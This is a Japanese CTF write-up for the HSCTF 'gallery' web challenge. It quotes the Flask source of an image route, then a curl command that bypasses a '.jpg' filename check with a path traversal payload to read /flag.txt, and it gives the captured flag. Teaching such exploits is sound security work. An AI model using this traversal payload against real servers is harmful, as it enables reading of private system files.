# gallery:web:201pts
Look at these images I found!  
[http://web1.hsctf.com:8003](http://web1.hsctf.com:8003/)  
Downloads  
[gallery.zip](gallery.zip)  

# Solution
URLとソースが渡される。  
アクセスすると、ギャラリーのようだ。  
Image Gallery  
[site.png](site/site.png)  
画像の一つを開くと次のようなURLへ遷移した。  
```
http://web1.hsctf.com:8003/image?image=Abstract-Wallpaper.jpg
```
パストラバーサルが怪しい。  
ソースを見ると以下のようであった。  
```python
~~~
@app.route("/image")
def image():
	if "image" not in request.args:
		return "Image not provided", 400
	if ".jpg" not in request.args["image"]:
		return "Invalid filename", 400
	
	file = IMAGE_FOLDER.joinpath(Path(request.args["image"]))
	if not file.is_relative_to(IMAGE_FOLDER):
		return "Invalid filename", 400
	
	try:
		return send_file(file.resolve())
	except FileNotFoundError:
		return "File does not exist", 400

@app.route("/flag")
def flag():
	if 2 + 2 == 5:
		return send_file("/flag.txt")
	else:
		return "No.", 400
~~~
```
フラグは`/flag.txt`にあり、`.jpg`が画像パスに含まれている必要がある。  
```bash
$ curl http://web1.hsctf.com:8003/image?image=.jpg/../../flag.txt
flag{1616109079_is_a_cool_number}
```
無理やり`.jpg`を入れ込みトラバーサルするとflagが読み取れた。  

## flag{1616109079_is_a_cool_number}